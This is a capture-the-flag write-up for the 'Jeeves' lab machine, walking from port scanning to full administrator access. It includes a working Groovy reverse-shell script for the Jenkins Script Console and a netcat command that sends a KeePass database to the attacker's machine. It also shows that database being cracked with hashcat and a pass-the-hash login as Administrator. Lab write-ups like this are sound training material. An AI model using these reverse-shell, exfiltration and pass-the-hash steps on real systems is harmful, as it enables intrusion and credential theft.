# Jeeves

# User Flag

## NMAP Enumeration

All Port NMAP Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.63

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
50000/tcp open  ibm-db2      syn-ack ttl 127
```

Port Service NMAP Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.10.63 -p 80,135,445,50000

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m01s, deviation: 0s, median: 5h00m01s
| smb2-time: 
|   date: 2024-05-26T17:52:03
|_  start_date: 2024-05-23T18:49:13
```

## Web - Ask Jeeves

Port 80 throws an error:

![Error Image](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Jeeves/Images/Error%20Image.png)


* Fuzzed port 50000 with `ffuf` - found the directory `askjeeves`:

```bash
ffuf -c -u http://10.10.10.63:50000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 79ms]
```

Navigating to the directory `askjeeves`, I can see that Jenkins is on the server. I don't encounter a login panel and can go straight to running code to get a reverse shell:

1. Go to Manage `Jenkins -> Script Console`
2. Add Groovy script to execute this code on Windows machine:

```bash
Thread.start {
String host="<your_machine_IP>";
int port=<your_webserver_port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

3. Setup netcat listener and run script and you should have session open in your listener.

Able to recover the user flag under the directory `kohsuke`:

```bash
Directory of C:\Users\kohsuke\Desktop

11/03/2017  11:19 PM    <DIR>          .
11/03/2017  11:19 PM    <DIR>          ..
11/03/2017  11:22 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   2,496,675,840 bytes free
```


# Root Flag

In the `C:\Users\kohsuke\Documents` directory, I found a keepass database titled `CEH.kdbx`.

```bash
C:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   2,691,592,192 bytes free
```

Copied the file using netcat:

```bash
# Kali
nc -l -p 1234 > CEH.kdbx

# Target Machine
nc -w 3 <kali-ip> 1234 < CEH.kdbx
```


Used `keepass2john` to convert hash:

```bash
> keepass2john CEH.kdbx

CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

Used Hashcat to crack it:

```bash
hashcat64.exe -m 13400 -a 0 hash.txt rockyou.txt -o cracked.txt
```

Opened the Keepass database with `keepass2`:

```bash
keepass2 CEH.kdbx
```

Found a hash under `Backup stuff` title: `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`.

Signed in using Pass The Hash attack:

```bash
pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd
```

Found a file called `hm.txt`:

```bash
C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```

Check for **alternate data streams**:

```bash
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

05/26/2024  04:36 PM    <DIR>          .
05/26/2024  04:36 PM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
```

Use powershell to read full string of root.txt:

```bash
powershell (Get-Content hm.txt -Stream root.txt)
```


# Resources

* [Hashcat Hash Types](https://hashcat.net/wiki/doku.php?id=example_hashes)

















